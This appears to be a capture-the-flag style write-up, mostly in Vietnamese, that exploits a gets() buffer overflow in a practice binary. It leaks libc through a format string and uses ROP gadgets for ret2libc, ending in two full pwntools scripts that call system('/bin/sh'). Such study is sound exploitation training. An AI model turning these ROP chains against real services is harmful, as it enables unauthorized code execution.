# pwn07 - ret2libc vs ROP

[Binary](https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/pwn07_rop_ret2libc)

### File

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ file something
something: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4558b5c7ea2d782f422eba9789995f071fb1fd07, for GNU/Linux 3.2.0, not stripped

```

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ rabin2 -z something
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002004 0x00402004 16  17   .rodata ascii Say something :
1   0x00002015 0x00402015 10  11   .rodata ascii Hello !!!!

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ r2 something
 -- Move the comments to the right changing their margin with asm.cmt.margin
[0x004010b0]> aaaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Scanning for strings constructed in code (/azs)
INFO: Finding function preludes (aap)
INFO: Enable anal.types.constraint for experimental type propagation
[0x004010b0]> afl
0x00401070    1     11 sym.imp.puts
0x00401080    1     11 sym.imp.printf
0x00401090    1     11 sym.imp.gets
0x004010a0    1     11 sym.imp.setvbuf
0x004010b0    1     46 entry0
0x004010f0    4     31 sym.deregister_tm_clones
0x00401120    4     49 sym.register_tm_clones
0x00401160    3     32 sym.__do_global_dtors_aux
0x00401190    1      6 sym.frame_dummy
0x004012b0    1      5 sym.__libc_csu_fini
0x004011dd    1     49 sym.vuln
0x004012b8    1     13 sym._fini
0x00401240    4    101 sym.__libc_csu_init
0x004010e0    1      5 sym._dl_relocate_static_pie
0x0040120e    1     37 main
0x00401000    3     27 sym._init
0x00401196    1     71 sym.setup
0x00401030    2     28 fcn.00401030
0x00401040    1     15 fcn.00401040
0x00401050    1     15 fcn.00401050
0x00401060    1     15 fcn.00401060

```

### Checksec

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ checksec something
[*] '/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

### Main func

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("Hello !!!!");
  vuln();
  return 0;
}
```

### Vuln func

```c
__int64 vuln()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("Say something : ");
  return gets(v1);
}

```

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ ./something
Hello !!!!
Say something : abc
```

Thì ở đây ta có thể thấy flow chương trình khá là đơn giản, ta có thể lợi dụng BOF với *gets*. Tuy nhiên ta cần biết phải return, control flow chương trình như nào. Ta hướng đến ret2libc

Do đó ta cần leak được địa chỉ hàm cụ thể => libc base. Nên ta sẽ lợi dụng hàm *prinf* để format string nhầm leak ra địa chỉ trên hàm trên binary.

Oke, giờ thì ta hướng đến việc ghi chuỗi format string *"%p %p %p %p"* vào đâu và how, oke ta sẽ ghi vào với *gets* và tại ô nhớ có thể ghi được, check bằng **vmmap**. Sau đấy sẽ dùng *printf* để format string.

Ta cần thêm vài gadgets cho việc đó như là **pop rdi ; ret** và **ret**

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ ROPgadget --binary something | grep "pop rdi
; ret"
0x00000000004012a3 : pop rdi ; ret
----------------------------------------------
0x000000000040101a : ret
```

Cần địa chỉ của hàm *printf*, *gets*, và *địa chỉ* lưu chuỗi **"%p %p %p %p"**

```python
pwndbg> disass vuln
Dump of assembler code for function vuln:
   0x00000000004011dd <+0>:     endbr64
   0x00000000004011e1 <+4>:     push   rbp
   0x00000000004011e2 <+5>:     mov    rbp,rsp
   0x00000000004011e5 <+8>:     sub    rsp,0x20
   0x00000000004011e9 <+12>:    lea    rdi,[rip+0xe14]        # 0x402004
   0x00000000004011f0 <+19>:    mov    eax,0x0
   0x00000000004011f5 <+24>:    call   0x401080 <printf@plt>
   0x00000000004011fa <+29>:    lea    rax,[rbp-0x20]
   0x00000000004011fe <+33>:    mov    rdi,rax
   0x0000000000401201 <+36>:    mov    eax,0x0
   0x0000000000401206 <+41>:    call   0x401090 <gets@plt>
   0x000000000040120b <+46>:    nop
   0x000000000040120c <+47>:    leave
   0x000000000040120d <+48>:    ret

```

```python
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x401000           0x402000 r-xp     1000   1000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x402000           0x403000 r--p     1000   2000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x403000           0x404000 r--p     1000   2000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
          0x404000           0x405000 rw-p     1000   3000 /mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc/something
    0x7ffff7d8b000     0x7ffff7d8e000 rw-p     3000      0 [anon_7ffff7d8b]
    0x7ffff7d8e000     0x7ffff7db6000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db6000     0x7ffff7f4b000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f4b000     0x7ffff7fa3000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa3000     0x7ffff7fa7000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa7000     0x7ffff7fa9000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa9000     0x7ffff7fb6000 rw-p     d000      0 [anon_7ffff7fa9]
    0x7ffff7fbc000     0x7ffff7fbe000 rw-p     2000      0 [anon_7ffff7fbc]
    0x7ffff7fbe000     0x7ffff7fc2000 r--p     4000      0 [vvar]
    0x7ffff7fc2000     0x7ffff7fc3000 r-xp     1000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]

```

ta cần ghi vào ô nhớ trống tránh việc ghi đè lên vùng nhớ đã chứa gữ liệu.

ta có thể check được điều đó với ***pwndbg> x/100s 0x404000***. ở đây mình chọn **0x404070**

Cần tính số byte để overflow đến return address, này đặt breakpoints và tính:

```python
>>> str = 0x7fffffffe000
>>> ret = 0x7fffffffe028
>>> ret - str
40

```

### leak func

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ python3 exploit.py
[+] Starting local process './something': pid 641
[*] running in new terminal: ['/usr/bin/gdb', '-q', './som[+] Starting local process './something': pid 641
[*] running in new terminal: ['/usr/bin/gdb', '-q', './something', '641', '-x', '/tmp/pwn2t5eqodz.gdb']
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
b'Hello !!!!\nSay something : '
[*] Switching to interactive mode
$ %p %p %p %p
0x1 0x1 0x7fb5af242aa0 (nil)Say something : $

```

```shell
pwndbg> x/s 0x7fb5af242aa0
0x7fb5af242aa0 <_IO_2_1_stdin_>:        "\213 \255", <incomplete sequence \373>
```

vậy ta nhận thấy là ở format string thứ 3 tức **%3$p** thì có được địa chỉ của hàm ****IO_2_1_stdin****

Tiếp theo muốn tính được *libc base* ta cần có offset của hàm ****IO_2_1_stdin****. How?

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "_IO_2_1_stdin_"
  2298: 0000000000219aa0   224 OBJECT  GLOBAL DEFAULT   34 _IO_2_1_stdin_@@GLIBC_2.2.5
```

Sau khi có được offset => tiến hành tính *libc_base*

Có *libc_base* ta cần thêm offset của *system* và */bin/sh* để lấy shell

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "system"
   396: 0000000000050d60    45 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
  2759: 0000000000169140   103 FUNC    GLOBAL DEFAULT   15 svcerr_systemerr@GLIBC_2.2.5

```

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/pwn07_rop_ret2libc$ strings -tx /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 1d8698 /bin/sh

```

> #### Ta có thể sử dụng Onegadget nếu thỏa các registers

## Exploit 1

```python
from pwn import *

r = process("./something")
gdb.attach(r, api= True)

print(r.recvuntil(b"something : "))

gets = 0x401090
printf = 0x401080
pop_rdi_ret = 0x00000000004012a3
format_string = 0x404500
ret_gadget = 0x000000000040101a
stdin_func_offset_of_libc = 0x0000000000219aa0
vuln_func_address = 0x00000000004011dd
system_func_offset = 0x0000000000050d60
binsh_string_offset = 0x1d8698

payload = b"A"*40 + p64(ret_gadget) +p64(pop_rdi_ret) + p64(format_string) +p64(gets)
payload += p64(ret_gadget) + p64(pop_rdi_ret) + p64(format_string) +p64(printf)
payload += p64(ret_gadget) + p64(vuln_func_address)
r.sendline(payload)

payload = b"%3$p"
r.sendline(payload)

output = r.recvuntil(b"something : ")
print(output)
stdin_address = int(output.split(b"Say")[0],16)

libc_base = stdin_address - stdin_func_offset_of_libc
print(hex(libc_base))

system_address = libc_base + system_func_offset
binsh_string_address =libc_base + binsh_string_offset

payload = b"A"*40 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(binsh_string_address) +p64(system_address)

r.sendline(payload)

r.interactive()

```

## Exploit 2

```python
from pwn import *

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
bianry = ELF('./something')

rop= ROP(bianry)
r = process(bianry.path)
gdb.attach(r, api = True)

junk = b'a'*40
printf_add = 0x401080
gets_add = 0x401090
vuln_add = 0x00000000004011dd
add_store_string = 0x404070
pop_rdi_ret = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]


print(r.recvuntil(b'something : '))

payload1 = junk + p64(ret) + p64(pop_rdi_ret) + p64(add_store_string)  + p64(gets_add)
payload1 += p64(ret) + p64(pop_rdi_ret) + p64(add_store_string)  + p64(printf_add)
payload1 += p64(ret) + p64(vuln_add)

r.sendline(payload1)

payload2 = b"%3$p"
r.sendline(payload2)
output = r.recvuntil(b"something : ")

stdin = int(output.split(b"Say")[0],16)
leak_stdin_offset = libc.symbols['_IO_2_1_stdin_']
libc_base = stdin - leak_stdin_offset

system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh\x00'))

system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

payload3 = junk + p64(ret) + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)
r.sendline(payload3)
r.interactive()

```
